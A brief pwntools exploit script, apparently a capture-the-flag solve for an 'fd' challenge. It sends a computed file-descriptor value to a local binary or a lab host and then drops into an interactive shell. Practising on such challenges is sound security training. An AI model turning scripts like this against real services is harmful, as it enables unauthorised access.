from pwn import * 
from pwn import p64


debug = 1
gdb_is = 0
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process('./fd')
    
else:
    host = "192.168.0.111:21372"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    # gdb.attach(r,'b* 0x00401571')
    gdb.attach(r)
    pause()
    pass

fd = str(3*4 | 0x29A)
info(fd)
r.sendafter(b'fd:',fd)
r.interactive()
